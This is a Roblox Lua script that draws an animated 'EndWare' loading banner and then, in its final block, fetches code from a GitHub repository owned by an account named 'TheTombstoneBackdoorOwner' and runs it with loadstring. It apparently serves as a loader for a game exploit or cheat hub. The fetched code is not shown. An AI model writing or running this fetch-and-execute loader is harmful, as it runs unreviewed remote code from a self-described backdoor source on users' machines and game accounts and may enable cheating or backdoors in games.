local CollectionService = game:GetService("CollectionService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local G2L = {}

-- Create main ScreenGui
G2L["ScreenGui_1"] = Instance.new("ScreenGui")
G2L["ScreenGui_1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["ScreenGui_1"].Parent = playerGui
CollectionService:AddTag(G2L["ScreenGui_1"], "main")

-- Create loading frame
G2L["Loading Menu_2"] = Instance.new("Frame")
G2L["Loading Menu_2"].Name = "Loading Menu"
G2L["Loading Menu_2"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["Loading Menu_2"].BorderSizePixel = 0
G2L["Loading Menu_2"].Size = UDim2.new(0.17812, 0, 0.10782, 0)
G2L["Loading Menu_2"].Position = UDim2.new(0.39375, 0, -0.2, 0)
G2L["Loading Menu_2"].Parent = G2L["ScreenGui_1"]

-- UICorner
Instance.new("UICorner", G2L["Loading Menu_2"])

-- Label inside the frame
G2L["TextLabel_4"] = Instance.new("TextLabel")
G2L["TextLabel_4"].Text = "EndWare --Ui Thanks to Rxs Scripted by bloxy animation etc by rxs"
G2L["TextLabel_4"].TextWrapped = true
G2L["TextLabel_4"].TextScaled = true
G2L["TextLabel_4"].RichText = true
G2L["TextLabel_4"].BackgroundTransparency = 1
G2L["TextLabel_4"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["TextLabel_4"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["TextLabel_4"].BorderSizePixel = 0
G2L["TextLabel_4"].Size = UDim2.new(0.99123, 0, 0.975, 0)
G2L["TextLabel_4"].Position = UDim2.new(0.00877, 0, 0, 0)
G2L["TextLabel_4"].Parent = G2L["Loading Menu_2"]

-- Aspect ratio
local aspect = Instance.new("UIAspectRatioConstraint")
aspect.AspectRatio = 2.85
aspect.Parent = G2L["Loading Menu_2"]

-- Slide In Tween
task.spawn(function()
	local slideInTween = TweenService:Create(
		G2L["Loading Menu_2"],
		TweenInfo.new(2.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
		{ Position = UDim2.new(0.39375, 0, 0.446, 0) }
	)
	slideInTween:Play()
end)

-- Text animation with dots
task.spawn(function()
	local baseText = "EndWare --Ui Thanks to Rxs Scripted by bloxy animation etc by rxs"
	local dotCount = 0
	while G2L["Loading Menu_2"] and G2L["Loading Menu_2"].Parent do
		dotCount = (dotCount + 1) % 4
		G2L["TextLabel_4"].Text = baseText .. string.rep(".", dotCount)
		task.wait(0.5)
	end
end)

-- Pulsing size animation
task.spawn(function()
	local pulseUp = true
	while G2L["Loading Menu_2"] and G2L["Loading Menu_2"].Parent do
		local sizeGoal = pulseUp and UDim2.new(0.19, 0, 0.115, 0) or UDim2.new(0.17812, 0, 0.10782, 0)
		pulseUp = not pulseUp
		local tween = TweenService:Create(
			G2L["Loading Menu_2"],
			TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{ Size = sizeGoal }
		)
		tween:Play()
		task.wait(0.4)
	end
end)

-- Swaying rotation animation
task.spawn(function()
	local angle = 5
	while G2L["Loading Menu_2"] and G2L["Loading Menu_2"].Parent do
		for i = -angle, angle do
			G2L["Loading Menu_2"].Rotation = i
			RunService.RenderStepped:Wait()
		end
		for i = angle, -angle, -1 do
			G2L["Loading Menu_2"].Rotation = i
			RunService.RenderStepped:Wait()
		end
	end
end)

-- Exit animation and cleanup
task.delay(4.5, function()
	if G2L["Loading Menu_2"] then
		local exitTween = TweenService:Create(
			G2L["Loading Menu_2"],
			TweenInfo.new(1.2, Enum.EasingStyle.Exponential, Enum.EasingDirection.InOut),
			{
				Size = UDim2.new(0, 0, 0, 0),
				Rotation = 180,
				BackgroundTransparency = 1,
				Position = G2L["Loading Menu_2"].Position + UDim2.new(0, 0, 0.05, 0)
			}
		)

		local textFade = TweenService:Create(
			G2L["TextLabel_4"],
			TweenInfo.new(1.2, Enum.EasingStyle.Exponential, Enum.EasingDirection.InOut),
			{ TextTransparency = 1 }
		)

		exitTween:Play()
		textFade:Play()
		exitTween.Completed:Wait()
		G2L["ScreenGui_1"]:Destroy()
	end
end)

-- Load external script (must be trusted)
local success, err = pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/FUCK/refs/heads/main/Main.lua", true))()
end)

if not success then
	warn("Failed to load external script:", err)
end
